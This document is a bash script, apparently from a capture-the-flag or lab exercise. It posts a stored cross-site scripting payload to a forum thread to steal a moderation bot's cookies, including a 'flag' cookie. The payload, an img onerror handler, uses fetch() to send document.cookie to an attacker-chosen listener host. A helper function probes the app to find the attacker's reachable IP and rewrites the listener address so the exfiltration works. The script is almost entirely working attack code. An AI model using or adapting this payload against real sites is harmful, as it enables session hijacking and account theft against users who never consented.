#!/usr/bin/env bash
# Breach: stored-xss-cookie-theft-flag
# Posts the stored-XSS payload to a forum thread to steal the moderation
# bot's cookies (its 'flag' cookie is not httpOnly).
# Usage: ./post-payload.sh <base_url> <thread_id> <listener_host:port> <cookie_jar>
set -euo pipefail
BASE="${1:-http://localhost:4942}"
THREAD="${2:-bbeo32ucx0a65b8}"
LISTENER="${3:-127.0.0.1:8888}"
if [ -z "${3:-}" ]; then
  echo "[!] using default listener $LISTENER — the vantage self-check below will rewrite it if the bot can't reach you"
fi
JAR="${4:-cookies_jdoe.txt}"

# Vantage self-check: find out which IP the app (and thus the bot) sees us
# at, via the /api/collect oracle. If LISTENER points at 127.0.0.1 but the
# bot reaches us at another address, rewrite the host part (port kept).
# Set KEEP_LISTENER=1 to only warn, or SKIP_VANTAGE_CHECK=1 to skip entirely.
vantage_check() {
  [ "${SKIP_VANTAGE_CHECK:-0}" = "1" ] && return 0
  local marker="vantage-$(date +%s)-$RANDOM"
  curl -s -o /dev/null "$BASE/api/collect?c=$marker" || return 0
  local from
  from=$(curl -s "$BASE/api/collect" | python3 -c "
import json, sys
try:
    for e in json.load(sys.stdin).get('captured', []):
        if e.get('data') == '$marker':
            print(e.get('from', '')); break
except Exception: pass" 2>/dev/null || true)
  if [ -z "$from" ]; then
    echo "[!] vantage probe failed — make sure the listener is reachable from the bot's vantage"
    return 0
  fi
  local host port
  host="${LISTENER%%:*}"; port="${LISTENER##*:}"
  if [ "$from" != "$host" ] && { [ "$host" = "127.0.0.1" ] || [ "$host" = "localhost" ] || [ "$host" = "192.168.1.63" ]; }; then
    if [ "${KEEP_LISTENER:-0}" = "1" ]; then
      echo "[!] WARNING: $LISTENER is likely unreachable from the bot (your reachable IP is $from)"
    else
      LISTENER="$from:$port"
      echo "[!] rewrote listener to $LISTENER (bot reaches you at $from; KEEP_LISTENER=1 to disable)"
    fi
  fi
}
vantage_check

PAYLOAD="<img src=x onerror=\"fetch('http://${LISTENER}/xss-hit?c='+encodeURIComponent(document.cookie))\">"

echo "[*] Posting payload to $BASE/forum/$THREAD/comment"
curl -s -b "$JAR" -X POST "$BASE/forum/$THREAD/comment" \
  --data-urlencode "content=$PAYLOAD" -o /dev/null -w "status=%{http_code}\n"

echo "[*] Waiting for the moderation bot (observed cadence 1–2 min)..."
echo "[*] Check xss-listener.py's hits.log for a hit carrying the flag cookie."
